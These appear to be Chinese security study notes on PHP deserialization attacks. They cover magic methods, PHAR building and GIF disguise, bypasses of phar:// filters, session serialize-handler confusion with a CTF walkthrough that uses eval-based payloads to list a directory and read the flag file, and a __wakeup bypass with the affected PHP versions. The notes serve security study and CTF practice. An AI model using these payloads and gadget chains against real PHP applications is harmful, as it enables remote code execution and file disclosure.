# PHP反序列化

大体审计思路：找到利用点，从后往前挖链子同java

1. __construct()，类的构造函数
2. __destruct()，类的析构函数
3. __call()，在对象中调用一个不可访问方法时调用
4. __callStatic()，用静态方式中调用一个不可访问方法时调用
5. __get()，获得一个类的成员变量时调用
6. __set()，设置一个类的成员变量时调用
7. __isset()，当对不可访问属性调用isset()或empty()时调用
8. __unset()，当对不可访问属性调用unset()时被调用。
9. __sleep()，执行serialize()时，先会调用这个函数
10. __wakeup()，执行unserialize()时，先会调用这个函数
11. __toString()，类被当成字符串时的回应方法
12. __invoke()，调用函数的方式调用一个对象时的回应方法
13. __set_state()，调用var_export()导出类时，此静态方法会被调用。
14. __clone()，当对象复制完成时调用
15. __autoload()，尝试加载未定义的类
16. __debugInfo()，打印所需调试信息

php中一些常见的流包装器如下：

```php+HTML
file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

报错利用

将原序列化中的一个类改为一个不可反序列化的类（如pdo类:php自带的一些类），造成fatal error，是程序终止，但 `__destuct`方法仍会执行

1. PHP内部类利用

   1. 利用Error/Exception 类进行XSS 

   2. ![image-20220804121105675](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804121105675.png)

   3. 利用soap类进行SSRF

      * php中soapclient类当调用不存在的方法时，会出发__call方法，可以发起http请求
      * ![image-20220804121115824](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804121115824.png)
   
   4. 利用``SplFileObject(文件流) `` 类读取文件
   
      ```php
      $b = "文件流";
      $a = new SplFileObject('$b');
      ```
   
      
   
   5. 利用`DirectoryIterator`类列目录
   
      ![image-20220803143103177](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220803143103177.png)
   
   6. 利用``FilesystemIterator`类列目录
   
      ![image-20220803143145580](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220803143145580.png)



## PHAR 反序列化

php8.0以后不可用

1. 触发点

   phar反序列化即在文件系统函数（`file_exists()`、`is_dir()`等）参数可控的情况下，配合`phar://伪协议`，可以不依赖`unserialize()`直接进行反序列化操作

2. 格式

   ```php
   <?php
       class Test {}
       $o = new Test();
       @unlink("phar.phar");
       $phar = new Phar("phar.phar"); //后缀名必须为phar
       $phar->startBuffering();
       $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
       $phar->setMetadata($o); //将自定义的meta-data存入manifest
       $phar->addFromString("test.txt", "test"); //添加要压缩的文件
       //签名自动计算
       $phar->stopBuffering();
   ?>
   ```

   0x03 影响的函数
   知道创宇的seaii 更为我们指出了所有文件函数均可使用：

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918183243195.png)

   但实际上只要调用了`php_stream_open_wrapper`的函数，都存在这样的问题。

   因此还有如下函数：

   exif

   - `exif_thumbnail`
   - `exif_imagetype`

   gd

   - `imageloadfont`
   - `imagecreatefrom`

   hash

   - `hash_hmac_file`
   - `hash_file`
   - `hash_update_file`
   - `md5_file`
   - `sha1_file`

   file / url

   - `get_meta_tags`
   - `get_headers`
   - `mime_content_type`

   standard

   - `getimagesize`
   - `getimagesizefromstring`

   finfo

   - `finfo_file`
   - `finfo_buffer`

   zip

   ```php
   $zip = new ZipArchive();
   $res = $zip->open('c.zip');
   $zip->extractTo('phar://test.phar/test');
   Postgres
   ```

   Postgres

   ```php
   <?php
   $pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
   @$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
   ```


   MySQL

   LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper

   ```php
   <?php
   class A {
       public $s = '';
       public function __wakeup () {
           system($this->s);
       }
   }
   $m = mysqli_init();
   mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
   $s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
   $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
   ```

   再配置一下mysqld。（非默认配置）

   [mysqld]
   local-infile=1
   secure_file_priv=""

   4. Trick
      （1）如果过滤了phar://协议怎么办呢？

      有以下几种方法可以绕过：

      - `compress.bzip2://phar://`
      - `compress.zlib://phar:///`
      - `php://filter/resource=phar://`


   （2）除此之外，我们还可以将phar伪造成其他格式的文件。

   php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：

       <?php
           class TestObject {
           }
       @unlink("phar.phar");
       $phar = new Phar("phar.phar");
       $phar->startBuffering();
       $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
       $o = new TestObject();
       $phar->setMetadata($o); //将自定义meta-data存入manifest
       $phar->addFromString("test.txt", "test"); //添加要压缩的文件
       //签名自动计算
       $phar->stopBuffering();

   ?>

## php-session反序列化

### session简单介绍

在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。

当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。

### session 的存储机制

php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 存储的文件是以sess_sessionid来进行命名的

| php_serialize | 经过serialize()函数序列化数组                            |
| ------------- | -------------------------------------------------------- |
| php           | 键名+竖线+经过serialize()函数处理的值                    |
| php_binary    | 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 |

### php.ini中一些session配置

> session.save_path="" --设置session的存储路径 session.save_handler=""--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动 session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php

### 利用姿势

#### session.upload_progress进行文件包含和反序列化渗透

这篇文章说的很详细了，没必要班门弄斧

https://www.freebuf.com/vuls/202819.html

#### 使用不同的引擎来处理session文件

##### $_SESSION变量直接可控

php引擎的存储格式是`键名|serialized_string`，而php_serialize引擎的存储格式是`serialized_string`。如果程序使用两个引擎来分别处理的话就会出现问题

来看看这两个php

```
// 1.php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['y4'] = $_GET['a'];
var_dump($_SESSION);
//2.php
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class test{
    public $name;
    function __wakeup(){
        echo $this->name;
    }
}
```

首先访问1.php，传入参数`a=|O:4:"test":1:{s:4:"name";s:8:"y4tacker";}`再访问2.php，注意不要忘记`|`

[![img](https://github.com/Y4tacker/Web-Security/raw/main/Unserialize/PHP/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png)](https://github.com/Y4tacker/Web-Security/blob/main/Unserialize/PHP/php反序列化/10.png)

由于`1.php`是使用`php_serialize`引擎处理，因此只会把`'|'`当做一个正常的字符。

然后访问`2.php`，由于用的是`php`引擎，因此遇到`'|'`时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对`'|'`后的值进行反序列化处理。

这里可能会有一个小疑问，为什么在解析session文件时直接对`'|'`后的值进行反序列化处理，这也是处理器的功能？这个其实是因为`session_start()`这个函数，可以看下官方说明：

> 当会话自动开始或者通过 **session_start()** 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 [session_set_save_handler()](https://www.php.net/manual/zh/function.session-set-save-handler.php) 设定的用户自定义会话管理器。 **通过 read 回调函数返回的现有会话数据**（使用特殊的序列化格式存储），**PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量**

因此我们成功触发了`test`类中的`__wakeup()`方法,所以这种攻击思路是可行的。但这种方法是在可以对`session`的进行赋值的，那如果代码中不存在对`$_SESSION`变量赋值的情况下又该如何利用

##### $_SESSION变量直接不可控

我们来看高校战疫的一道CTF题目

```
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

我们注意到这样一句话`ini_set('session.serialize_handler', 'php');`，因此不难猜测本身在`php.ini`当中的设置可能是`php_serialize`，在查看了`phpinfo`后得证猜测正确，也知道了这道题的考点

那么我们就进入phpinfo查看一下，enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，就可以将filename的值赋值到session中

[![img](https://github.com/Y4tacker/Web-Security/raw/main/Unserialize/PHP/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png)](https://github.com/Y4tacker/Web-Security/blob/main/Unserialize/PHP/php反序列化/11.png)

构造文件上传的表单

```
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="777" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

接下来构造序列化payload

```
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='print_r(scandir(dirname(__FILE__)));';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

由于采用Burp发包，为防止双引号被转义，在双引号前加上`\`，除此之外还要加上`|`

在这个页面随便上传一个文件，然后抓包修改`filename`的值

[![img](https://github.com/Y4tacker/Web-Security/raw/main/Unserialize/PHP/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png)](https://github.com/Y4tacker/Web-Security/blob/main/Unserialize/PHP/php反序列化/12.png)

可以看到`Here_1s_7he_fl4g_buT_You_Cannot_see.php`这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看

[![img](https://github.com/Y4tacker/Web-Security/raw/main/Unserialize/PHP/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png)](https://github.com/Y4tacker/Web-Security/blob/main/Unserialize/PHP/php反序列化/13.png)

因此我们只需要把payload，当中改为`print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));`即可获取flag

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

## wakeup绕过

### 总结

绕过的条件：删除掉序列化数据的最后一个 `}` 或者在 最后两个 `}` 中间加上 `;`

影响版本：

Success:
7.0.15 - 7.0.33, 7.1.1 - 7.1.33, 7.2.0 - 7.2.34, 7.3.0 - 7.3.28, 7.4.0 - 7.4.16, 8.0.0 - 8.0.3